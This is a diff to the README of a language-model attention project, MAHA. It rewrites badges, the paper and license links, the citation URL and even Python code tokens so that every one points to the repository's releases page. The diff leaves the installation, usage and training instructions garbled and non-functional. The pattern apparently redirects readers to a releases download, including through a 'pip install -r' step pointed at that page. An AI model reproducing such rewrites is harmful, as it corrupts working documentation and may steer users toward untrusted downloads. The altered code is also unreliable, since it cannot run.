@@ -2,14 +2,14 @@
 
 <div align="center">
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Python](https://img.shields.io/badge/python-3.8%2B-green)
-![PyTorch](https://img.shields.io/badge/pytorch-2.0%2B-orange)
-[![arXiv](https://img.shields.io/badge/arXiv-2512.14925-b31b1b.svg)](https://arxiv.org/abs/2512.14925)
+![License](https://github.com/canererden/MAHA-Project/releases)
+![Python](https://github.com/canererden/MAHA-Project/releases%2B-green)
+![PyTorch](https://github.com/canererden/MAHA-Project/releases%2B-orange)
+[![arXiv](https://github.com/canererden/MAHA-Project/releases)](https://github.com/canererden/MAHA-Project/releases)
 
 **A Game-Theoretic and Optimization-Driven Approach to Efficient Contextual Modeling in Large Language Models**
 
-[**Read the Paper**](https://arxiv.org/abs/2512.14925)
+[**Read the Paper**](https://github.com/canererden/MAHA-Project/releases)
 
 </div>
 
@@ -66,11 +66,11 @@ MAHA demonstrates superior efficiency on long-sequence tasks (e.g., PG-19) compa
 ## Installation
 ```bash
 # Clone the repository
-git clone [https://github.com/canererden/MAHA-Project.git](https://github.com/canererden/MAHA-Project.git)
+git clone [https://github.com/canererden/MAHA-Project/releases](https://github.com/canererden/MAHA-Project/releases)
 cd MAHA-Project
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://github.com/canererden/MAHA-Project/releases
 
 ```
 
@@ -83,7 +83,7 @@ You can use `MAHABlock` as a drop-in replacement for standard attention layers o
 
 ```python
 import torch
-from src.models.transformer import MAHATransformer
+from https://github.com/canererden/MAHA-Project/releases import MAHATransformer
 
 # Initialize Model with Convex Aggregation
 model = MAHATransformer(
@@ -96,14 +96,14 @@ model = MAHATransformer(
 )
 
 # Move to GPU
-device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
-model.to(device)
+device = https://github.com/canererden/MAHA-Project/releases("cuda" if https://github.com/canererden/MAHA-Project/releases() else "cpu")
+https://github.com/canererden/MAHA-Project/releases(device)
 
 # Forward Pass
-dummy_input = torch.randint(0, 30000, (1, 4096)).to(device)
+dummy_input = https://github.com/canererden/MAHA-Project/releases(0, 30000, (1, 4096)).to(device)
 output, aux_loss = model(dummy_input)
 
-print(f"Output Shape: {output.shape}")  # (1, 4096, 768)
+print(f"Output Shape: {https://github.com/canererden/MAHA-Project/releases}")  # (1, 4096, 768)
 
 ```
 
@@ -113,7 +113,7 @@ To replicate the training runs from the paper:
 
 ```bash
 # Train on synthetic data or configured dataset
-python train.py --config configs/default_maha.yaml
+python https://github.com/canererden/MAHA-Project/releases --config https://github.com/canererden/MAHA-Project/releases
 
 # Run Unit Tests
 python -m unittest discover tests/
@@ -130,8 +130,8 @@ maha-project/
 │   ├── optimization/    # Differentiable solvers (Convex & Game Theory)
 │   └── utils/           # Metrics and helpers
 ├── tests/               # Unit tests for tensor shapes and gradients
-├── train.py             # Main training loop
-└── requirements.txt     # Dependencies
+├── https://github.com/canererden/MAHA-Project/releases             # Main training loop
+└── https://github.com/canererden/MAHA-Project/releases     # Dependencies
 
 ```
 
@@ -144,10 +144,10 @@ If you use this code or our results in your research, please cite our work using
   author={Erden, Caner},
   journal={arXiv preprint arXiv:2512.14925},
   year={2025},
-  url={https://arxiv.org/abs/2512.14925}
+  url={https://github.com/canererden/MAHA-Project/releases}
 }
 
 ```
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://www.google.com/search?q=LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/canererden/MAHA-Project/releases) file for details.
